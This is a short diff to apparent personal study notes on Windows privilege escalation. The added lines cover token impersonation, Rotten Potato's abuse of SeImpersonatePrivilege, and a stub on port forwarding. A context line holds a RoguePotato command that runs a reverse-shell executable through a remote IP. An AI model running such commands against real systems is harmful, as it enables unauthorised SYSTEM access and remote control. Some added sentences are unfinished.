@@ -291,7 +291,16 @@ The attack tricks Windows into authentication as the SYSTEM user to fake HTTP se
 From the shell (local system):
 ```C:\PrivEsc\RoguePotato.exe -r 10.5.16.43 -e "C:\PrivEsc\reverse2.exe" -l 9999```
 
+# Token Impersonation
 
+There are service accounts such as SQL. Service accounts can be given special privilegesin order for them to run their services and cannot be logged into directly. Unfortunately, making easier to escalate them
 
+Rotten Potato
+
+The original Rotten Potato exploit was identifiedin 2016. Service accounts could intercept a SYSTEM ticket and useit to impersonate the SYSTEM user. This was possible because accounts usually have the 'SeImpersonatePrivilege' privilege enabled. 
+
+# Port Forwarding
+
+Sometimes it is easier to run exploit code on Kali, but the vulnerable service is running on port on Windows, so to access the service in Kali, we simply implement Port Forwarding
 
 
